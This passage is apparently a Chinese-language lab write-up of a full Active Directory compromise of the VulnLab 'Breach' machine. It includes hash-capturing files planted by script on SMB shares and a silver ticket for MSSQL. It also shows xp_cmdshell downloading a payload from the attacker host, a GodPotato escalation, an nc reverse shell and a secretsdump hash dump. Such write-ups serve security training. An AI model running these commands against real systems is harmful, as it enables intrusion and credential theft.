+<p>既然可以成功列出共享目錄，那就可以嘗試 <code>--rid-brute</code>​ 一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.10.103.36 -u <span class="string">&#x27;guest&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --rid-brute 10000</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106064613-9hor5gi.png" alt="image">​</p>
+<p>得到所有的用戶名，然後再看一下共享目錄裏面有什麽：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -U <span class="string">&quot;guest%&quot;</span> //10.10.103.36/share</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106070034-66qyjfj.png" alt="image">​</p>
+<h2 id="Capture-NetNTLMv2"><a href="#Capture-NetNTLMv2" class="headerlink" title="Capture NetNTLMv2"></a>Capture NetNTLMv2</h2><p>裏面什麽也沒有，所以嘗試放一些文件上去，看下能不能釣到 hash，使用 ntlm_theft 生成釣 hash 文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 /Tools/Windows/NtlmTheft/ntlm_theft.py --generate all --server 10.8.4.212 --filename manetesting </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106065933-lrjbxca.png" alt="image">​</p>
+<p>然後打開 <code>responder</code>​：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo responder -I tun0</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106070141-wvit9nq.png" alt="image">​</p>
+<p>由於共享目錄裏面的子文件夾很多，不知道放在哪個文件夾，於是只能使用 <code>smbmap</code>​ 抓取所有的目錄，然後一個一個目錄放：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106073658-l14mjkt.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106073721-n8en9o0.png" alt="image">​</p>
+<p>大概的脚本如下，爲了以後可以使用，我封裝好了整個脚本：<a target="_blank" rel="noopener" href="https://github.com/manesec/tools4mane/blob/main/Windows/SMBLashi.sh">https://github.com/manesec/tools4mane/blob/main/Windows/SMBLashi.sh</a></p>
+<p>下面的脚本會把當前目錄裏面的所有文件挨個上傳到所有的子目錄中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">password=<span class="string">&#x27;&#x27;</span></span><br><span class="line">host=<span class="string">&#x27;10.10.103.36&#x27;</span></span><br><span class="line">sharename=<span class="string">&#x27;share&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">smbmap -u <span class="string">&quot;<span class="variable">$username</span>&quot;</span> -p <span class="string">&quot;<span class="variable">$password</span>&quot;</span> -H <span class="string">&quot;<span class="variable">$host</span>&quot;</span> -r <span class="string">&quot;<span class="variable">$sharename</span>&quot;</span> --depth 5 --dir-only --csv output.csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># root directory</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] Trying to root folder&quot;</span></span><br><span class="line">smbclient <span class="string">&quot;//<span class="variable">$host</span>/<span class="variable">$sharename</span>&quot;</span> -U <span class="string">&quot;<span class="variable">$username</span>%<span class="variable">$password</span>&quot;</span> -c <span class="string">&#x27;prompt OFF; mput *&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sub-directory</span></span><br><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  permission=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span> | awk -F <span class="string">&quot;,&quot;</span> <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$permission</span>&quot;</span> = <span class="string">&quot;READ_WRITE&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">     share_path=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span> | awk -F <span class="string">&quot;,&quot;</span> <span class="string">&#x27;&#123;print $5&#125;&#x27;</span>)</span><br><span class="line">     share_name=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$share_path</span>&quot;</span> | awk -F <span class="string">&#x27;//&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">     target_path=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$share_path</span>&quot;</span> | awk -F <span class="string">&#x27;//&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">   </span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&quot;[*] Process <span class="variable">$share_name</span> : <span class="variable">$target_path</span>&quot;</span></span><br><span class="line">     smbclient <span class="string">&quot;//<span class="variable">$host</span>/<span class="variable">$sharename</span>&quot;</span> -U <span class="string">&quot;<span class="variable">$username</span>%<span class="variable">$password</span>&quot;</span> -c <span class="string">&quot;cd <span class="variable">$target_path</span>; prompt OFF; mput *&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span> &lt; output.csv</span><br></pre></td></tr></table></figure>
+
+<h2 id="Crack-ntlmv2-for-Julia-Wong"><a href="#Crack-ntlmv2-for-Julia-Wong" class="headerlink" title="Crack ntlmv2 for Julia.Wong"></a>Crack ntlmv2 for Julia.Wong</h2><p>等了一會就得到了 hash ：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106073736-yva0asv.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Julia.Wong::BREACH:1122334455667788:A6BF2058AAEB07545D12D32CD6DA7A28:010100000000000080658ED70860DB01C3CB949AE4C7B83100000000020008004D0044005000420001001E00570049004E002D005A004F00340051004F004A004700350056003300310004003400570049004E002D005A004F00340051004F004A00470035005600330031002E004D004400500042002E004C004F00430041004C00030014004D004400500042002E004C004F00430041004C00050014004D004400500042002E004C004F00430041004C000700080080658ED70860DB01060004000200000008003000300000000000000001000000002000000F73D8FDC0696036F2874CEE32B0A96A489CB47DF67B19770CFDD32C94A0210B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0038002E0034002E003200310032000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>然後嘗試破解一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106073825-u8xk3xt.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Computer1</span><br></pre></td></tr></table></figure>
+
+<h2 id="Login-as-mssql-with-Julia-Wong-and-capture-service-account-ntlmv2"><a href="#Login-as-mssql-with-Julia-Wong-and-capture-service-account-ntlmv2" class="headerlink" title="Login as mssql with Julia.Wong and capture service account ntlmv2"></a>Login as mssql with Julia.Wong and capture service account ntlmv2</h2><p>成功破解了 hash ，看了一下是普通的用戶，由於 mssql 的端口打開，所以嘗試登錄看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mssqlclient.py Julia.Wong:Computer1@10.10.103.36 -windows-auth</span><br></pre></td></tr></table></figure>
+
+<p>結果發現有 <code>xp_dirtree</code>​ 權限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_dirtree \\10.8.4.212\mane</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106081558-3ud5unm.png" alt="image">​</p>
+<p>如果使用 <code>xp_dirtree</code>​指向本地，這樣就可以嘗試得到 hash ：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106081606-dgwnu11.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc_mssql::BREACH:1122334455667788:528ED39F0AC01ECB2FE344BF171E2552:01010000000000008085B21F1360DB01CAE402A3A667F2FB000000000200080035004A005700490001001E00570049004E002D0033005800540057004C004D004F00540034003900480004003400570049004E002D0033005800540057004C004D004F0054003400390048002E0035004A00570049002E004C004F00430041004C000300140035004A00570049002E004C004F00430041004C000500140035004A00570049002E004C004F00430041004C00070008008085B21F1360DB01060004000200000008003000300000000000000000000000003000000F73D8FDC0696036F2874CEE32B0A96A489CB47DF67B19770CFDD32C94A0210B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0038002E0034002E003200310032000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>嘗試破解了一下，發現成功的還原了密碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106081534-uppglgi.png" alt="image">​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trustno1</span><br></pre></td></tr></table></figure>
+
+<h2 id="Sliver-ticket-attack-to-mssql-admin-and-enable-xp-cmdshell"><a href="#Sliver-ticket-attack-to-mssql-admin-and-enable-xp-cmdshell" class="headerlink" title="Sliver ticket attack to mssql admin and enable xp_cmdshell"></a>Sliver ticket attack to mssql admin and enable xp_cmdshell</h2><p>也就是說 <code>svc_mssql</code>​ 的用戶密碼是 <code>Trustno1</code>​，既然有了服務賬號那就可以玩 <code>sliver ticket attack</code>​。</p>
+<p>因爲它可以 impersonal 到管理員，然後開啓 <code>xp_cmdshell</code>​，這樣就得到了 shell。</p>
+<p>在開始之前需要準備：</p>
+<ul>
+<li>Domain SID</li>
+<li>Server username and nt hash</li>
+</ul>
+<p>所以使用 netexec 的 <code>--get-sid</code>​ 可以快速得到 sid ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec ldap 10.10.103.36 -u Julia.Wong -p <span class="string">&#x27;Computer1&#x27;</span> --get-sid</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106081909-3jhnq7d.png" alt="image">​</p>
+<p>由於上面還原到了密碼，於是把密碼放進去 <a target="_blank" rel="noopener" href="https://www.browserling.com/tools/ntlm-hash">NTLM Password Hasher</a> 就可以得到該用戶的hash：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250107084440-0h4wdtm.png" alt="image">​</p>
+<p>有了hash 就可以製作票據：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ticketer.py -nthash 69596C7AA1E8DAEE17F8E78870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -spn MSSQLSvc/breachdc.breach.vl administrator -domain breach.vl</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106081952-2uzx1jl.png" alt="image">​</p>
+<p>然後就是經典的 pass the ticket：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">$ mssqlclient.py administrator@breachdc.breach.vl -k -no-pass</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106082129-i0p8bi9.png" alt="image">​</p>
+<p>可以看到現在是管理員的用戶，所以嘗試開啓 <code>xp_cmdshell</code>​ 然後上傳個 shell ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell <span class="built_in">mkdir</span> C:\mane</span><br><span class="line"></span><br><span class="line">xp_cmdshell curl 10.8.4.212/mane.exe -o C:\mane\mane.exe</span><br><span class="line"></span><br><span class="line">xp_cmdshell C:\mane\mane.exe</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106082307-jovusfq.png" alt="image">​</p>
+<h1 id="Exploit-SeImpersonatePrivilege-with-god-potato-to-get-NT-SYSTEM"><a href="#Exploit-SeImpersonatePrivilege-with-god-potato-to-get-NT-SYSTEM" class="headerlink" title="Exploit SeImpersonatePrivilege with god potato to get NT SYSTEM"></a>Exploit SeImpersonatePrivilege with god potato to get NT SYSTEM</h1><p>成功了之後看一下權限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> /priv</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106082414-yfna6wn.png" alt="image">​</p>
+<p>看到有一個 <code>SeImpersonatePrivilege</code>​ ，於是就可以直接 godpotato 得到 NTSystem：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\mane&gt; .\god.exe -cmd <span class="string">&quot;C:\mane\nc.exe -e cmd.exe 10.8.4.212 1111&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106082631-746w887.png" alt="image">​</p>
+<p>增加一個管理員就可以 <code>secretsdump</code>​ ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user mane P@ssw0rd /add</span><br><span class="line">net group <span class="string">&quot;Domain admins&quot;</span> mane /add</span><br><span class="line">net localgroup administrators mane /add</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106083003-plxt8y3.png" alt="image">​</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py mane:<span class="string">&#x27;P@ssw0rd&#x27;</span>@10.10.103.36</span><br><span class="line">Impacket v0.13.0.dev0+20241127.154729.af51dfd - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0xcc2f9de1ef06ddd4e2edc49bbaf6914b</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9a47efd620c2f6d349dd035274d2117:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information.</span></span><br><span class="line"><span class="string">[*] Dumping cached domain logon information (domain/username:hash)</span></span><br><span class="line"><span class="string">[*] Dumping LSA Secrets</span></span><br><span class="line"><span class="string">[*] $MACHINE.ACC</span></span><br><span class="line"><span class="string">BREACH\BREACHDC$:aes256-cts-hmac-sha1-96:5fe88fd072fc8bd9b8ae3ff4f9478bae2eabb4d958763f2b3b237f6280909abc</span></span><br><span class="line"><span class="string">BREACH\BREACHDC$:aes128-cts-hmac-sha1-96:26fb3d7d49bf6d997962dc3095d810e3</span></span><br><span class="line"><span class="string">BREACH\BREACHDC$:des-cbc-md5:13239d57bfadf170</span></span><br><span class="line"><span class="string">BREACH\BREACHDC$:plain_password_hex:1f7b2fbbb9cb872e3e27f17074dd88b198a207224821154c8a6e7045ebd882ba11fcce063f543120318552b1981ca6e80bfc9c4a256962c5413528ba62b8cf6b25d58919bc83c16761a0faaf6397a224df5816fa137f4bab9b9e172691f8ad2b256d66608efb8e050875de62b7cc10baa1b56f707e90affbbeff1e2d48c2abe9bb2fd0c0ea66c2ae66a3ff39e3076235186b8e9d7333115255e21f5c8b3191813f0ee5400c475242d0f83c6f1e5931ad956ebb9d6c583919e63ba39eaea996249efa90dcbfc40ff3e5ab40cb0a4db5d6fc6871f08d598f48946d34b237906d569815e768e48831a5432443ecc3557fb3</span></span><br><span class="line"><span class="string">BREACH\BREACHDC$:aad3b435b51404eeaad3b435b51404ee:d40e80bb86b0d3d616b18d28815a384b:::</span></span><br><span class="line"><span class="string">[*] DefaultPassword</span></span><br><span class="line"><span class="string">BREACH\julia.wong:Computer1</span></span><br><span class="line"><span class="string">[*] DPAPI_SYSTEM</span></span><br><span class="line"><span class="string">dpapi_machinekey:0x966d33573c8e8cb4667096265e1df50138d6989f</span></span><br><span class="line"><span class="string">dpapi_userkey:0x84a3f8647ed66d7f128c50b0723806619799e840</span></span><br><span class="line"><span class="string">[*] NL$KM</span></span><br><span class="line"><span class="string"> 0000   B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44   ...~.....9....$D</span></span><br><span class="line"><span class="string"> 0010   A2 E4 4D C2 09 59 46 C0  7F 95 EA 11 CB 7F CB 72   ..M..YF........r</span></span><br><span class="line"><span class="string"> 0020   EC 2E 5A 06 01 1B 26 FE  6D A7 88 0F A5 E7 1F A5   ..Z...&amp;.m.......</span></span><br><span class="line"><span class="string"> 0030   96 CD E5 3F A0 06 5E C1  A5 01 A1 CE 8C 24 76 95   ...?..^......$v.</span></span><br><span class="line"><span class="string">NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695</span></span><br><span class="line"><span class="string">[*] _SC_MSSQL$SQLEXPRESS</span></span><br><span class="line"><span class="string">BREACH\svc_mssql:Trustno1</span></span><br><span class="line"><span class="string">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span><br><span class="line"><span class="string">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9a47efd620c2f6d349dd035274d2117:::</span></span><br><span class="line"><span class="string">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="string">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:051e1c9e689e7e4c9fb7164433b9ba8e:::</span></span><br><span class="line"><span class="string">breach.vl\Claire.Pope:1105:aad3b435b51404eeaad3b435b51404ee:407269bacd94665e972e2c61c1de7a15:::</span></span><br><span class="line"><span class="string">breach.vl\Julia.Wong:1106:aad3b435b51404eeaad3b435b51404ee:b4c8a5ef4dd292edd06b613d2c518ddc:::</span></span><br><span class="line"><span class="string">breach.vl\Hilary.Reed:1107:aad3b435b51404eeaad3b435b51404ee:39da4813065bd52215fb5614b956873b:::</span></span><br><span class="line"><span class="string">breach.vl\Diana.Pope:1108:aad3b435b51404eeaad3b435b51404ee:ee1458cde3182d47514a107afd1236f2:::</span></span><br><span class="line"><span class="string">breach.vl\Jasmine.Price:1109:aad3b435b51404eeaad3b435b51404ee:4c8c779f1e48435bb0bf235afd921988:::</span></span><br><span class="line"><span class="string">breach.vl\George.Williams:1110:aad3b435b51404eeaad3b435b51404ee:8a3891bd96479611d4eec391ca592519:::</span></span><br><span class="line"><span class="string">breach.vl\Lawrence.Kaur:1111:aad3b435b51404eeaad3b435b51404ee:2ed316bf52a9f155fc25440fae777d0f:::</span></span><br><span class="line"><span class="string">breach.vl\Jasmine.Slater:1112:aad3b435b51404eeaad3b435b51404ee:6df17991ea82048f8f03734f1f4449c8:::</span></span><br><span class="line"><span class="string">breach.vl\Hugh.Watts:1113:aad3b435b51404eeaad3b435b51404ee:656f2dbe61c431b5ca58a1a5001d51f6:::</span></span><br><span class="line"><span class="string">breach.vl\Christine.Bruce:1114:aad3b435b51404eeaad3b435b51404ee:74eeaab55e418b6247ea35db833da742:::</span></span><br><span class="line"><span class="string">breach.vl\svc_mssql:1115:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::</span></span><br><span class="line"><span class="string">mane:1116:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::</span></span><br><span class="line"><span class="string">BREACHDC$:1000:aad3b435b51404eeaad3b435b51404ee:d40e80bb86b0d3d616b18d28815a384b:::</span></span><br><span class="line"><span class="string">[*] Kerberos keys grabbed</span></span><br><span class="line"><span class="string">Administrator:aes256-cts-hmac-sha1-96:7d677394e09ee30dedce3a3d105d1bd194c04ef43d2bd64609507c296e64cb7d</span></span><br><span class="line"><span class="string">Administrator:aes128-cts-hmac-sha1-96:27d3ee82e9e94f6b22c14971d7b3c5fb</span></span><br><span class="line"><span class="string">Administrator:des-cbc-md5:b55110b6917a9832</span></span><br><span class="line"><span class="string">krbtgt:aes256-cts-hmac-sha1-96:f299f4c22759ef186d3cb645cb686d159b3a8cc6361aab937c6c4c92e5cc1c11</span></span><br><span class="line"><span class="string">krbtgt:aes128-cts-hmac-sha1-96:e686045450efb66a72e92e1cba352e6a</span></span><br><span class="line"><span class="string">krbtgt:des-cbc-md5:7f8a4a9894403e08</span></span><br><span class="line"><span class="string">breach.vl\Claire.Pope:aes256-cts-hmac-sha1-96:7b4913dc2ae266607cfad7419f95c35d36a3b9c143b706f09055568ce12f1be8</span></span><br><span class="line"><span class="string">breach.vl\Claire.Pope:aes128-cts-hmac-sha1-96:021251261b86fd7849572f100566903f</span></span><br><span class="line"><span class="string">breach.vl\Claire.Pope:des-cbc-md5:08d53e15f110a4a1</span></span><br><span class="line"><span class="string">breach.vl\Julia.Wong:aes256-cts-hmac-sha1-96:24870ecb6cd96aa3b89c3b6f24076f3e0ea76dd14e2f21b52037e6b6e5494c11</span></span><br><span class="line"><span class="string">breach.vl\Julia.Wong:aes128-cts-hmac-sha1-96:bb679c797db968259ba319c29102acae</span></span><br><span class="line"><span class="string">breach.vl\Julia.Wong:des-cbc-md5:d691c7ab230d7685</span></span><br><span class="line"><span class="string">breach.vl\Hilary.Reed:aes256-cts-hmac-sha1-96:d1c2cd4db2de46063b0b5f8e2c237dc2d7fbed5b3f376ad391d220425a8969e3</span></span><br><span class="line"><span class="string">breach.vl\Hilary.Reed:aes128-cts-hmac-sha1-96:fdefe45a8750e1a29f5d707cca8591f2</span></span><br><span class="line"><span class="string">breach.vl\Hilary.Reed:des-cbc-md5:f87373bf6bc8ec25</span></span><br><span class="line"><span class="string">breach.vl\Diana.Pope:aes256-cts-hmac-sha1-96:718007452646f811724eeab83089db8f4c48b91c1d55ca6cc3434a522cf2f309</span></span><br><span class="line"><span class="string">breach.vl\Diana.Pope:aes128-cts-hmac-sha1-96:4fd742b740417ef1d63dcef387720c88</span></span><br><span class="line"><span class="string">breach.vl\Diana.Pope:des-cbc-md5:bf79d661e325bfb9</span></span><br><span class="line"><span class="string">breach.vl\Jasmine.Price:aes256-cts-hmac-sha1-96:8fb32967b169ba6af24563ba98cfda1d320412a6b042e12ed66e2638d0073cb8</span></span><br><span class="line"><span class="string">breach.vl\Jasmine.Price:aes128-cts-hmac-sha1-96:7baa0ddccddf0a7ebf3e2a54cd2ce51d</span></span><br><span class="line"><span class="string">breach.vl\Jasmine.Price:des-cbc-md5:ec433bd55704463d</span></span><br><span class="line"><span class="string">breach.vl\George.Williams:aes256-cts-hmac-sha1-96:b0b0588b31ed790b911d8bdce6faa6d76da70fae8c451fa91c1db79f2d5384d0</span></span><br><span class="line"><span class="string">breach.vl\George.Williams:aes128-cts-hmac-sha1-96:2d6cd7e8a3b8894493169eade4b7fdf2</span></span><br><span class="line"><span class="string">breach.vl\George.Williams:des-cbc-md5:341064e3238f80fb</span></span><br><span class="line"><span class="string">breach.vl\Lawrence.Kaur:aes256-cts-hmac-sha1-96:ce77ecf680504688ceb2705d78b87289ffa9f1539fe66d3ee3b51ea8e57341b5</span></span><br><span class="line"><span class="string">breach.vl\Lawrence.Kaur:aes128-cts-hmac-sha1-96:5603f86db6b1fb75f8219ca17d70c195</span></span><br><span class="line"><span class="string">breach.vl\Lawrence.Kaur:des-cbc-md5:c28fcdcd7c5ebfef</span></span><br><span class="line"><span class="string">breach.vl\Jasmine.Slater:aes256-cts-hmac-sha1-96:37dfefa5be6b5abf4b9e91daba3b28c2b390c33f0944ec45bca768ab6670c60b</span></span><br><span class="line"><span class="string">breach.vl\Jasmine.Slater:aes128-cts-hmac-sha1-96:6d434345fdb1c2d6abbbf59b82ac388b</span></span><br><span class="line"><span class="string">breach.vl\Jasmine.Slater:des-cbc-md5:2ce57f6eb5efcd8a</span></span><br><span class="line"><span class="string">breach.vl\Hugh.Watts:aes256-cts-hmac-sha1-96:dd58485d61ada722f1c3d34aa336d448525bd2398b7e0462d77297ad31bff385</span></span><br><span class="line"><span class="string">breach.vl\Hugh.Watts:aes128-cts-hmac-sha1-96:5056b46faaf01e5f0bef6f91cdd91d40</span></span><br><span class="line"><span class="string">breach.vl\Hugh.Watts:des-cbc-md5:61618f91e63bcdb3</span></span><br><span class="line"><span class="string">breach.vl\Christine.Bruce:aes256-cts-hmac-sha1-96:61f92859959cc388283987946a3b145d3b0095215f6aacb7325026de850d2cfe</span></span><br><span class="line"><span class="string">breach.vl\Christine.Bruce:aes128-cts-hmac-sha1-96:a3d6371646eb428f41707e9d104046f6</span></span><br><span class="line"><span class="string">breach.vl\Christine.Bruce:des-cbc-md5:730ef485648ce3cb</span></span><br><span class="line"><span class="string">breach.vl\svc_mssql:aes256-cts-hmac-sha1-96:acb4bc05dee5b6cd685b7f54810327378726f441e1a780406bfdf5ffeec1686a</span></span><br><span class="line"><span class="string">breach.vl\svc_mssql:aes128-cts-hmac-sha1-96:4999b1f55d245b5a152796064887a9f5</span></span><br><span 